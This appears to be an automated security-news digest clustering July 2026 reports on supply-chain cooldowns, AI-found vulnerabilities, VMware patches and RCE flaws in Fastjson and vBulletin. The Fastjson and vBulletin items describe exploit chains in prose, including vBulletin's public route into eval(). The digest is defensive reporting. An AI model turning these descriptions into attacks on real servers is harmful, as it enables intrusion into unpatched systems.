#### Primary article taxonomy
- threat_categories: supply_chain
- affected_products: PyPI, npm
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
If you use and install packages from npm or PyPI, the first hours after a package is published are the riskiest because scanners can’t analyze packages before publication. Recent supply chain events affecting NodeJS and Python packages have been detected and removed within hours. However, while those packages were available to the general public, it’s […]
```

#### Full body

```
AWS Security Blog Secure your npm and pip package updates in Amazon Linux If you use and install packages from npm or PyPI, the first hours after a package is published are the riskiest because scanners can’t analyze packages before publication. Recent supply chain events affecting NodeJS and Python packages have been detected and removed within hours. However, while those packages were available to the general public, it’s possible that they were installed by users, creating the potential for a security incident. As you will see from the data that follows, if users had waited 1 day before accessing those packages, none of the recent supply chain security events would have had an impact. In this post, I show you a one-line configuration that you can use to eliminate this exposure in your environment: a dependency cooldown for npm and pip. This change tells your package manager to skip versions published in the last 24 hours, giving the security community time to detect and remove unexpected packages before they reach your systems. These settings secure the default setup. There’s another use case of package updates: receiving security fixes to address security risks. This process involves updating packages to a more recent version. I also show you how to override the cooldown configuration so you can install the latest security patches while newly installed package updates are delayed. We recommend that you assess the severity of code defects and apply security fixes if there’s known risk. Handling security fixes based on their severity—and how to specify SLAs for these fixes based on severity—is beyond the scope of this blog post. Background: Two risks pull in opposite directions Software delivered by Amazon Linux packages go through review by Amazon package maintainers and pass guardrails before release. Open source software is developed and maintained with similar processes and guardrails. The npm and PyPI registries have open publishing access and don’t enforce reviews. Unexpected packages are potentially added to the registries because of risks like impersonation or stolen credentials. You’re caught between two risks: older software accumulates unpatched vulnerabilities, while new packages potentially contain unexpected vulnerabilities that haven’t been detected yet. The best approach is to stay current without adopting the newest releases immediately, while applying recommended security fixes. The following diagram illustrates the relation between the two types of risks in an abstract way, where the supply chain risk is highest immediately after a package is published, because unexpected updates can potentially bypass guardrails. After a package is published, auditing can review it and identify potential defects over time. If no security fixes are applied, the risk of all the code defects adds up. Figure 1: Software risk over lifetime. Unpatched vulnerabilities risk increases over time. Very recent software also carries more supply chain risk. The problem: The first day presents the highest risk Supply chain events follow a consistent pattern. An unexpected author publishes an unexpected package or package version and waits for automated systems and users to pull it in. Security researchers and automated scanners typically detect and remove these packages within hours, but by then, systems have been exposed to the risk. Datadog’s 2026 State of DevSecOps report found that 54% of JavaScript applications install at least one dependency within a day of its release. That’s the time window that presents the highest supply chain risk. Recent events show how fast detection happens: Event Exposure window Nx s1ngularity (Aug 2025) 4–5 hours axios (Mar 2026) 2–3 hours Bitwarden CLI (Apr 2026) 93 minutes TanStack (May 2026) 30 minutes node-ipc (May 2026) less than 24 hours The solution: Skip packages published today A dependency cooldown tells your package manager to skip recently published versions. If a version hasn’t existed on th
```

#### Corroborating sources (1)

- **AWS Security Blog** (cloud_identity_infrastructure)
  - Title: Secure your npm and pip package updates in Amazon Linux
  - Published: 2026-07-29T14:53:39+00:00
  - Link: https://aws.amazon.com/blogs/security/secure-your-npm-and-pip-package-updates-in-amazon-linux/
  - Summary: If you use and install packages from npm or PyPI, the first hours after a package is published are the riskiest because scanners can’t analyze packages before publication. Recent supply chain events affecting NodeJS and Python packages have been detected and removed within hours. However, while those packages were available to the general public, it’s […]

### Cluster b61889968b — score 14

- Title: Just 1% of AI-Discovered Vulnerabilities Exploited in the Wild, Research Shows
- Source: Infosecurity Magazine (cyber_news_breach_reporting)
- Published: 2026-07-29T10:15:00+00:00
- Link: https://www.infosecurity-magazine.com/news/one-percent-ai-vulnerabilities/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ransomware_extortion, zero_day
- affected_products: Anthropic/Claude, OpenAI/ChatGPT, WordPress
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, zero_day, active_exploitation
- affected_products: WordPress, OpenAI/ChatGPT, Anthropic/Claude
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
For now, the use of AI benefits vulnerability research more than vulnerability exploitation, a VulnCheck researcher said
```

#### Full body

```
Infosecurity Magazine Home » News » Just 1% of AI-Discovered Vulnerabilities Exploited in the Wild, Research Shows Just 1% of AI-Discovered Vulnerabilities Exploited in the Wild, Research Shows News 29 July 2026 Written by Kevin Poireault Reporter , Infosecurity Magazine Follow @Kpoireault Connect on LinkedIn Software vulnerabilities discovered using AI tools are being exploited at the same rate as those discovered without the use of AI, a VulnCheck researcher has found. In VulnCheck’s State of Exploitation H1 2026 report , Patrick Garrity, vulnerability researcher, observed that 14 of the 1061 vulnerabilities attributed to AI-assisted discovery have been confirmed as exploited in the wild. This represents 1.3% of vulnerabilities identified using AI, roughly matching the overall exploitation rate of all vulnerabilities for the reported period. The researcher also found that while Anthropic reported more than 23,000 findings through its Project Glasswing , only 126 have resulted in published CVEs and just one has been confirmed as exploited in the wild. These findings add nuance to warnings from some quarters that AI tools like Anthropic's Mythos and other frontier models could trigger a ‘vulnpocalypse,’ flooding the security landscape with a wave of newly discovered, mass-exploited vulnerabilities. Garrity said that for now, vulnerability intelligence shows evidence that the use of frontier AI models is “more likely to give cyber defenders an advantage in strengthening software than to give attackers an advantage in discovering vulnerabilities before the software producers do.” KEV Exploitation Growth Lags Behind Rising CVE Volume VulnCheck identified nearly 500 known exploited vulnerabilities (KEVs) in the first half of 2026. These appear to be being exploited faster than ever before, with the median time from CVE publication to KEV falling from 120 days in 2025 to 80 days during the first half of 2026. However, the research found that 23.43% of KEVs recorded in the first half of 2026 showed evidence of exploitation on or before the day the CVE was published, a slight drop from the 28.93% of one-day and zero-day KEVs observed in 2025. Additionally, exploitation activity early in the CVE lifecycle remained steady, with roughly 200 CVEs becoming exploited within 31 days in the first half of 2026. “Early exploitation activity has not scaled at the same pace as CVE issuance,” said Garrity. Source: VulnCheck Content management systems (CMS) remained the most targeted technology category, accounting for 163 KEVs, one-third of all recorded KEVs. They are followed by network edge devices (68), operating systems (44) and server software (40). Meanwhile, AI products are emerging as a new attack surface , with known exploitation affecting model-building tools, workload-scaling platforms, AI gateways, agents and workflow automation. Source: VulnCheck The VulnCheck report includes every KEV added to VulnCheck’s own KEV catalog during the first half of 2026, based on CVE publication date and earliest evidence of exploitation. The AI-discovered vulnerabilities mentioned in this report come from both Garrity’s own recording of vulnerabilities reported through Anthropic’s Project Glaswing and telemetry from the Berkeley Vulnerability Research Initiative . You may also like Researchers Build WordPress Exploit Using OpenAI's GPT News 20 July 2026 Infosecurity Europe: Patch Responsibility Remains Up for Grabs as AI Unearths Decades of Flaws News 3 June 2026 Two Critical Flaws in n8n AI Workflow Automation Platform Allow Complete Takeover News 4 February 2026 Organizations Found to Address Only 21% of GenAI-Related Vulnerabilities News 15 April 2025 Microsoft Condemns "Uncoordinated" Zero Day Disclosures News 28 May 2026 What’s Hot on Infosecurity Magazine? Read Shared Watched Editor's Choice Porn Site xHamster Hit by Malvertising Wave News 25 September 2015 1 Ransomware Groups Increasingly Deploy EDR Kill Techniques News 27 July 2026 2 New CREST
```

#### Corroborating sources (1)

- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Just 1% of AI-Discovered Vulnerabilities Exploited in the Wild, Research Shows
  - Published: 2026-07-29T10:15:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/one-percent-ai-vulnerabilities/
  - Summary: For now, the use of AI benefits vulnerability research more than vulnerability exploitation, a VulnCheck researcher said

### Cluster e67ac609ab — score 13

- Title: Fastjson 1.x RCE Vulnerability Targeted in Attacks With No Patched Available
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-07-25T12:52:43+00:00
- Link: https://thehackernews.com/2026/07/fastjson-1x-rce-vulnerability-targeted.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-16723

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- affected_industries: financial_services, healthcare, retail_ecommerce
- affected_products: GitHub
- cve_ids: CVE-2026-16723
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_industries: healthcare, financial_services, retail_ecommerce
- affected_products: GitHub
- cve_ids: CVE-2026-16723
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
Security firms ThreatBook and Imperva say attackers are targeting a critical flaw in Fastjson, Alibaba's JSON library for Java. In affected Spring Boot applications, a malicious JSON request can execute code without authentication, with the privileges of the Java process. Tracked as CVE-2026-16723, the vulnerability carries an Alibaba-assigned CVSS score of 9.0. The confirmed chain requires
```

#### Full body

```
Fastjson 1.x RCE Vulnerability Targeted in Attacks With No Patched Available  Swati Khandelwal  Jul 25, 2026 Vulnerability / Application Security Security firms ThreatBook and Imperva say attackers are targeting a critical flaw in Fastjson, Alibaba's JSON library for Java. In affected Spring Boot applications, a malicious JSON request can execute code without authentication, with the privileges of the Java process. Tracked as CVE-2026-16723 , the vulnerability carries an Alibaba-assigned CVSS score of 9.0. The confirmed chain requires Fastjson 1.2.68 through 1.2.83, a Spring Boot executable fat-JAR, a network-reachable path that sends attacker-controlled JSON to an affected parser, and SafeMode left at its disabled default. AutoType can remain disabled, and no classpath gadget is required. As of July 25, Alibaba had not released a fixed Fastjson 1.x version. Organizations that cannot migrate immediately should enable SafeMode with -Dfastjson.parser.safeMode=true or use com.alibaba:fastjson:1.2.83_noneautotype . Alibaba lists migration to Fastjson2 as the long-term fix. Alibaba published its advisory on July 21 following responsible disclosure by Kirill Firsov of FearsOff Cybersecurity. The maintainers described the vulnerability as requiring "no AutoType enablement" and "no classpath gadget." They verified the chain on Spring Boot 2.x, 3.x, and 4.x with JDK 8, 11, 17, and 21. Firsov traced the issue to Fastjson's type-resolution path. An attacker-controlled @type value can be turned into a class-resource lookup. In a compatible Spring Boot fat-JAR, a crafted nested JAR path can fetch attacker-controlled bytecode. An @JSONType annotation in that resource can then be treated as a trust signal, allowing the class to pass Fastjson's type checks and load. His technical analysis also describes a newer-JDK path that downloads a remote JAR and references it through /proc/self/fd . The exploit depends on the Spring Boot executable fat-JAR loader. Alibaba lists plain non-fat JARs, generic uber-JARs, and Tomcat or Jetty WAR deployments as unaffected. Reachable entry points include JSON.parse , JSON.parseObject(String) , and JSON.parseObject(String, Class) . Binding input to a fixed class is not sufficient when an object contains an Object or Map field where the payload can be nested. ThreatBook said on July 22 that its platform had captured in-the-wild exploitation after adding detection support two days earlier. Its laboratory results were narrower: it reproduced full code execution in a Spring Boot fat-JAR on JDK 8, while its embedded Tomcat test produced only a remote JAR fetch or server-side request forgery. Imperva reported activity against financial services, healthcare, computing, retail, and other organizations, primarily in the United States, with smaller volumes in Singapore and Canada. It said browser impersonators generated most requests, while Ruby and Go tools represented about 30% collectively. Neither vendor published attack counts, raw requests, execution evidence, named victims, or confirmed compromises. Their reports establish observed exploit activity, not proof of successful code execution against a real-world target or a breach. A July 23 CISA-ADP assessment nevertheless marked exploitation as none . The Hacker News confirmed on July 25 that the flaw was absent from CISA's current Known Exploited Vulnerabilities catalog . The available sources do not explain the mismatch. The Hacker News also found no patched Fastjson 1.x artifact in the project's GitHub tags or Maven Central repository as of July 25. Version 1.2.83 remains the latest standard 1.x release, while 1.2.83_noneautotype remains the available restricted build. Organizations should inventory direct and transitive Fastjson dependencies and inspect affected systems for suspicious @type values, nested JAR URLs, unexpected outbound connections, child processes, file changes, and web shells. Fastjson2 is not affected because it does not use the same resource-
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Fastjson 1.x RCE Vulnerability Targeted in Attacks With No Patched Available
  - Published: 2026-07-25T12:52:43+00:00
  - Link: https://thehackernews.com/2026/07/fastjson-1x-rce-vulnerability-targeted.html
  - Summary: Security firms ThreatBook and Imperva say attackers are targeting a critical flaw in Fastjson, Alibaba's JSON library for Java. In affected Spring Boot applications, a malicious JSON request can execute code without authentication, with the privileges of the Java process. Tracked as CVE-2026-16723, the vulnerability carries an Alibaba-assigned CVSS score of 9.0. The confirmed chain requires

### Cluster 1276a22842 — score 13

- Title: Simple Job Board ≤ 2.11.0 - Unauthenticated RCE (CVE-2024-1813)
- Source: Reddit r/netsec (reddit_practitioner_osint)
- Published: 2026-07-28T14:04:05+00:00
- Link: https://www.reddit.com/r/netsec/comments/1v8zh25/simple_job_board_2110_unauthenticated_rce/
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2024-1813

#### Cluster taxonomy (union across members)
- cve_ids: CVE-2024-1813
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Primary article taxonomy
- cve_ids: CVE-2024-1813
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Summary

```
submitted by /u/MobetaSec [link] [comments]
```

#### Corroborating sources (1)

- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: Simple Job Board ≤ 2.11.0 - Unauthenticated RCE (CVE-2024-1813)
  - Published: 2026-07-28T14:04:05+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1v8zh25/simple_job_board_2110_unauthenticated_rce/
  - Summary: submitted by /u/MobetaSec [link] [comments]

### Cluster f4490338d9 — score 12

- Title: Horizon3’s NodeZero® AI Hacker Extends Production-Safe Autonomous Pentesting to Web Applications
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-07-29T13:17:09+00:00
- Link: https://horizon3.ai/news/press-release/nodezero-webapp-launch/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, data_breach
- affected_industries: media_communications
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: credential_theft, data_breach
- affected_industries: media_communications
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Horizon3 announced NodeZero® WebApp Pentesting, extending its AI-powered autonomous security validation platform to continuously test web applications and validate complete attack paths across identities, infrastructure, cloud, and sensitive data.
```

#### Full body

```
Horizon3’s NodeZero® AI Hacker Extends Production-Safe Autonomous Pentesting to Web Applications Business Wire July 29, 2026 Press Releases New capabilities deliver continuous, end-to-end attack-path validation across web apps, infrastructure, cloud, data, and identity – proving real business impact, not isolated findings SAN FRANCISCO – July 29, 2026 – Horizon3 today announced the expansion of its NodeZero® platform with AI-powered web application pentesting capabilities. NodeZero, the world’s most experienced AI hacker, can now autonomously and safely test web applications the way real attackers operate, chaining vulnerabilities from application abuse through credential theft, lateral movement, cloud pivots, and sensitive data exposure. Web applications have never been more exposed or more critical to secure. The rapid deployment of “vibe-coded” applications built with generative AI has introduced a wave of systems riddled with exploitable flaws. At the same time, threat actors are using AI to rapidly find and weaponize those weaknesses faster than defenders can patch them. Traditional approaches that test web applications in isolation fall short because a web app is rarely the final objective, but instead the front door into the business. Once inside, attackers live off the land. They steal credentials, move laterally across the network, pivot into cloud environments, and reach the sensitive data that matters to the business. NodeZero WebApp Pentesting closes the gap by delivering production-safe autonomous testing that spans web applications, infrastructure, cloud, data, and identity. It proves what is actually exploitable, quantifies the business consequence of each attack path, and maps those paths to the tactics of known threat actors, enabling companies to accurately prioritize and urgently fix vulnerabilities that matter. “Legacy web application security tools are notoriously noisy. They flood teams with theoretical findings that lack context or business impact,” said Snehal Antani, Co-Founder and CEO of Horizon3. “The first generation of AI-driven web app pentesting performed well in cyber ranges, Capture the Flag (CTF) labs, and on bug-bounty leaderboards, but it wasn’t built to run safely against real enterprise production systems. Until now, no technology could chain vulnerabilities across application, infrastructure, cloud, and identity at scale. That’s where NodeZero is different. We built the World’s Best AI Hacker by running hundreds of thousands of production-safe tests against the largest, most sensitive networks in the world. With each test the system gets smarter, and that same engine now operates end-to-end from the web app all the way to business impact.” NodeZero® WebApp Pentesting delivers: Continuous, autonomous testing of pre-production and production applications, using the same production safe engine that already powers NodeZero’s internal, external, and cloud pentesting. Full attack-path chaining that demonstrates how weaknesses such as SQL injection and broken access control can escalate into host compromise, domain control, or data exposure. Evidence of exploitability and business risk to accurately prioritize and urgently remediate, versus the legacy approach that is noisy, theoretical risk. Coverage of the OWASP Top 10 , complex access-control failures that traditional scanners routinely miss, and the credential-based attack techniques that mirror how modern adversaries actually operate. Horizon3 initially made the new capabilities available through an Early Access program where 95 customers globally, including Fortune 10 enterprises, safely tested hundreds of production web applications. During the Beta, a major social media company discovered a broken access control flaw in a critical component that was missed by human reviewers, showcasing the power of using AI to comprehensively discover and exploit difficult-to-find vulnerabilities. Horizon3 will showcase the new solution live at Black Ha
```

#### Corroborating sources (1)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: Horizon3’s NodeZero® AI Hacker Extends Production-Safe Autonomous Pentesting to Web Applications
  - Published: 2026-07-29T13:17:09+00:00
  - Link: https://horizon3.ai/news/press-release/nodezero-webapp-launch/
  - Summary: Horizon3 announced NodeZero® WebApp Pentesting, extending its AI-powered autonomous security validation platform to continuously test web applications and validate complete attack paths across identities, infrastructure, cloud, and sensitive data.

### Cluster 3a5451ad51 — score 12

- Title: Security Validation Should Begin Where Attackers Begin
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-07-29T13:15:00+00:00
- Link: https://horizon3.ai/intelligence/blogs/web-application-security-validation/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Modern attacks increasingly begin with web applications. Learn why security validation must extend beyond finding vulnerabilities to validating attack paths and real business impact.
```

#### Full body

```
Security Validation Should Begin Where Attackers Begin Stephen Gates July 29, 2026 Blogs Why enterprise attack paths demand a new approach to security validation. Modern attacks increasingly begin with the web application. Customer portals, partner platforms, APIs, external business applications, and AI-powered services have become the front door to the enterprise. The systems organizations build to create value are now the same systems attackers target for initial access. For years, security teams have invested heavily in protecting networks, endpoints, identities, and cloud infrastructure. Those investments remain essential, but the way attackers gain initial access has changed. Business-critical applications are internet-facing, constantly evolving, deeply connected to enterprise systems, and often changing faster than organizations can continuously validate them. Artificial intelligence is accelerating this shift. The time between vulnerability discovery and exploitation continues to shrink, allowing attackers to identify and weaponize weaknesses at machine speed. Yet while attacks have evolved, much of security validation still reflects yesterday’s architecture. That shift is exactly why we built NodeZero WebApp , extending autonomous attack validation to where modern attacks increasingly begin. Validation Still Reflects Yesterday’s Architecture Most organizations still organize security by technology. Application security teams test web applications. Identity teams validate authentication and access controls. Cloud teams secure cloud infrastructure, while infrastructure teams assess networks and endpoints. Each discipline performs valuable work. The problem is that attackers don’t organize themselves the same way. They move across technologies, chaining weaknesses together until they reach their objective. A vulnerable application becomes compromised credentials. Compromised credentials become identity abuse. Identity abuse becomes access to cloud resources, infrastructure, and eventually the business systems they were after all along. Which means security validation often stops where the next stage of the attack begins. Attack Paths Don’t Stop at the Web Application A SQL injection isn’t the outcome. It’s the beginning of an attack path. An authentication weakness isn’t the breach. It’s simply the first opportunity to move deeper into the environment. The question isn’t whether a vulnerability exists. Security teams already have plenty of ways to answer that. The real question is what an attacker can do after exploiting it. Can they compromise identities? Reach sensitive data? Pivot into cloud resources? Move laterally into critical business systems? Security teams don’t lose because they missed a vulnerability. They lose because they never validated where it could lead. Modern attacks don’t unfold within a single technology stack. They move across applications, identities, infrastructure, and cloud environments until they create business impact. Security validation has to reflect that reality. Security Validation Has to Change For years, organizations validated individual technologies because that’s how enterprise environments were built. That approach made sense when applications, identities, infrastructure, and cloud platforms operated more independently and attackers moved more slowly. Today’s attacks don’t respect those boundaries. Validation shouldn’t either. It has to begin where attackers begin and continue until business impact is understood. Asking the Right Question Many security tools begin with privileged knowledge. They analyze source code, configuration files, or other internal artifacts before identifying weaknesses. Those approaches answer important questions during software development and secure coding, and they remain an important part of building secure software. Attackers begin with what they can reach, interacting with an application as it exists in production, scouring exposed source code looking
```

#### Corroborating sources (1)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: Security Validation Should Begin Where Attackers Begin
  - Published: 2026-07-29T13:15:00+00:00
  - Link: https://horizon3.ai/intelligence/blogs/web-application-security-validation/
  - Summary: Modern attacks increasingly begin with web applications. Learn why security validation must extend beyond finding vulnerabilities to validating attack paths and real business impact.

### Cluster a2f02aea7e — score 12

- Title: Three Critical VMware Flaws Allow Auth Bypass, Code Execution, and VM Escape
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-07-29T15:31:15+00:00
- Link: https://thehackernews.com/2026/07/three-critical-vmware-flaws-allow-auth.html
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: CVE-2026-59309, VMware

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ddos
- affected_products: Microsoft SharePoint, OpenAI/ChatGPT, VMware
- cve_ids: CVE-2026-41703, CVE-2026-41709, CVE-2026-47876, CVE-2026-59309, CVE-2026-59310
- urgency_signals: actively_exploited, poc_available
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ddos, active_exploitation
- affected_products: Microsoft SharePoint, VMware, OpenAI/ChatGPT
- cve_ids: CVE-2026-59309, CVE-2026-59310, CVE-2026-47876, CVE-2026-41703, CVE-2026-41709
- urgency_signals: actively_exploited, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Broadcom has released security updates to address multiple security flaws impacting VMware ESX, vCenter, Workstation, and Fusion, three of which have been designated as critical in severity. The first of the three critical-rated flaws is CVE-2026-59309 (CVSS score: 9.8), which has been described as an authentication bypass in VMware vCenter. "A malicious actor with network access to vCenter
```

#### Full body

```
Three Critical VMware Flaws Allow Auth Bypass, Code Execution, and VM Escape  Ravie Lakshmanan  Jul 29, 2026 Vulnerability / Enterprise Security Broadcom has released security updates to address multiple security flaws impacting VMware ESX, vCenter, Workstation, and Fusion, three of which have been designated as critical in severity. The first of the three critical-rated flaws is CVE-2026-59309 (CVSS score: 9.8), which has been described as an authentication bypass in VMware vCenter. "A malicious actor with network access to vCenter may exploit this issue to bypass authentication and gain unauthorized access to the system," Broadcom said. The second critical flaw is a directory-traversal vulnerability in vCenter ( CVE-2026-59310 , CVSS score: 9.8) that a malicious actor with network access can exploit to execute arbitrary code. Both vulnerabilities have been addressed in the versions below - VMware Cloud Foundation, VMware vSphere Foundation versions 9.1.x.x (Fixed in 9.1.0.0300) VMware Cloud Foundation, VMware vSphere Foundation versions 9.0.x.x (Fixed in 9.0.2.0100) VMware vCenter version 8.0 (Fixed in 8.0 U3k) VMware Cloud Foundation versions 5.x (Async patch to 8.0 U3k) Also patched by Broadcom are three other flaws - CVE-2026-47876 (CVSS score: 9.3) - An out-of-bounds write vulnerability in the VMXNET3 virtual network adapter of VMware ESX that a malicious actor with local administrative privileges on a virtual machine can exploit to execute code on the host. (Fixed in VMware Cloud Foundation and VMware vSphere Foundation versions ESXi-9.1.0.0200-25557999 and ESXi-9.0.2.0100-25595025, and VMware ESX ESXi80U3k-25595708) CVE-2026-41703 (CVSS score: 7.6) - An out-of-bounds read vulnerability in VMware ESX that a malicious actor with VM deployment privileges could trigger, potentially leading to information disclosure or a denial-of-service (DoS) condition. On VMware Workstation and Fusion, the impact is limited to information disclosure. (Fixed in VMware Cloud Foundation and VMware vSphere Foundation versions ESXi-9.1.0.0-25370933 and ESXi-9.0.2.0100-25595025, VMware ESX ESXi80U3i-25205845, VMware Workstation 26H1, VMware Fusion 26H1, and VMware Cloud Foundation 5.2.3) CVE-2026-41709 (CVSS score: 2.7) - An insufficient logging vulnerability in VMware ESX that a malicious administrator can exploit to perform certain operations without them being logged. (Fixed in VMware Cloud Foundation and VMware vSphere Foundation versions ESXi-9.1.0.0-25370933 and ESXi-9.0.2.0100-25595025, and VMware ESX ESXi80U3j-25429389) Broadcom noted that it has found no evidence to suggest any of these issues have been exploited in the wild. The technology giant also characterized CVE-2026-47876 as a virtual machine escape. "An attacker who already holds local administrative privileges inside a virtual machine that uses the VMXNET3 virtual network adapter may execute code on the ESX host," it said . Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Authentication Security , Cloud security , denial of service , enterprise security , remote code execution , Virtualization Security , VMware , Vulnerability ⚡ Top Stories This Week New Bit2Watt Attack Could Let Cloud Tenants Disrupt Power Grids Without an Exploit Open-Source Android AI Agents Could Let Invisible Screen Text Run Code on Host PCs Critical SharePoint RCE CVE-2026-50522 Under Active Exploitation After Public PoC AWS Kiro Flaw Let a Poisoned Web Page Rewrite Its Config and Run Code Apple Fixes Hide My Email Bug That Exposed Real Addresses in Mail Logs Microsoft Azure DevOps MCP Flaw Lets Hidden PR Comments Hijack AI Review Agents OpenAI Says Its AI Models Escaped Sandbox, Targeted Hugging Face to Cheat Benchmark Adobe Acrobat Extension Flaw Let Malicious Sites Read WhatsApp Web Data Ubuntu snap-confine Flaw Could Give Local Users Root on Default Desktop Installs Nine-Ye
```

#### Corroborating sources (2)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Three Critical VMware Flaws Allow Auth Bypass, Code Execution, and VM Escape
  - Published: 2026-07-29T15:31:15+00:00
  - Link: https://thehackernews.com/2026/07/three-critical-vmware-flaws-allow-auth.html
  - Summary: Broadcom has released security updates to address multiple security flaws impacting VMware ESX, vCenter, Workstation, and Fusion, three of which have been designated as critical in severity. The first of the three critical-rated flaws is CVE-2026-59309 (CVSS score: 9.8), which has been described as an authentication bypass in VMware vCenter. "A malicious actor with network access to vCenter
- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Critical VM Escape Vulnerability Patched in VMware ESXi
  - Published: 2026-07-29T11:42:38+00:00
  - Link: https://www.securityweek.com/critical-vm-escape-vulnerability-patched-in-vmware-esxi/
  - Summary: A total of five vulnerabilities have been patched in VMware ESXi, vCenter, Workstation, and Fusion. The post Critical VM Escape Vulnerability Patched in VMware ESXi appeared first on SecurityWeek .

### Cluster 2d87c8dc74 — score 12

- Title: Public Exploit Released for Patched vBulletin Pre-Auth Code Execution Flaw
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-07-27T14:40:00+00:00
- Link: https://thehackernews.com/2026/07/public-exploit-released-for-patched.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, zero_day
- cve_ids: CVE-2026-61511
- urgency_signals: no_patch_yet, poc_available, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, active_exploitation
- cve_ids: CVE-2026-61511
- urgency_signals: zero_day, preauth_unauth, no_patch_yet, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Public exploit details released on July 27 show how an unauthenticated request can reach PHP's eval() function inside vBulletin and execute code on an unpatched forum server. The attack requires no account, administrative access, or interaction from another user. SSD Secure Disclosure lists vBulletin 6.2.1 and earlier, and 6.1.6 and earlier, as affected, but does not give a lower version
```

#### Full body

```
Public Exploit Released for Patched vBulletin Pre-Auth Code Execution Flaw  Swati Khandelwal  Jul 27, 2026 Vulnerability / Website Security Public exploit details released on July 27 show how an unauthenticated request can reach PHP's eval() function inside vBulletin and execute code on an unpatched forum server. The attack requires no account, administrative access, or interaction from another user. SSD Secure Disclosure lists vBulletin 6.2.1 and earlier, and 6.1.6 and earlier, as affected, but does not give a lower version boundary. vBulletin issued security patches for 6.2.1, 6.2.0, and 6.1.6 at the end of June and released the fixed version 6.2.2 on July 1, nearly four weeks before the exploit went public Administrators running self-hosted installations should apply the patch for their branch or upgrade to 6.2.2. vBulletin says its Cloud sites have already been patched against the flaw. SSD did not report active exploitation. As of July 27, 2026, no source had confirmed in-the-wild attacks, and CVE-2026-61511 was not listed in CISA's Known Exploited Vulnerabilities catalog. The company published an interactive proof-of-concept, but the script as posted contains a one-character error, a letter where a digit belongs, that stops it running unchanged. The mistake is trivial to correct and does not affect the underlying vulnerability. One thing the public record does not settle is whether the flaw was used in the roughly four weeks between the late-June patch and the July 27 disclosure; neither SSD's advisory nor vBulletin's notices address that window. SSD's technical analysis identifies it as CVE-2026-61511 , an unauthenticated remote code execution flaw in vBulletin's template engine. No CVE.org or National Vulnerability Database record, and so no official severity score, was available at the time of writing; the NVD stopped routinely enriching new CVEs with CVSS scores earlier this year. SSD credits an unnamed independent researcher, though the published exploit is signed "EgiX," the handle of Egidio Romano , who disclosed vBulletin's 2025 template-engine code-execution chain. The vulnerable code sits in /includes/vb5/template/runtime.php , inside the vB5_Template_Runtime::runMaths() method, which handles inline math in templates. The function strips characters outside a restricted set, then passes what remains directly to eval() . The filter blocks letters but permits digits, parentheses, concatenation, arithmetic operators, and binary operators such as XOR, enough to reconstruct PHP strings and callable function names without any letters, using a restricted-character technique the advisory calls "phpfuck." Reaching it does not require the admin panel. vBulletin renders templates over a public route, ajax/render/pagenav , and the stock pagenav template copies a visitor-supplied pagenav[pagenumber] value into a {vb:math} tag, which passes it to runMaths() . That chain is what turns a template bug into pre-authentication remote code execution; SSD's PoC uses it to rebuild PHP's system function and run an operating-system command, returning the output in the HTTP response. The Hacker News reproduced the disclosed filtering and evaluation logic locally to check the reported error. With the typo corrected, a harmless strlen() test payload executed; without it, the allowlist stripped the stray letter and left syntactically invalid PHP. The test confirmed the expression-building flaw, not a complete attack against a live vBulletin server. The exploit's own banner calls the issue a zero-day, but the vendor's patches and the 6.2.2 release preceded public disclosure by nearly four weeks. The exploit code is new; the flaw it targets was already fixed. With Cloud reportedly patched and the self-hosted fixes nearly a month old, the live risk is concentrated 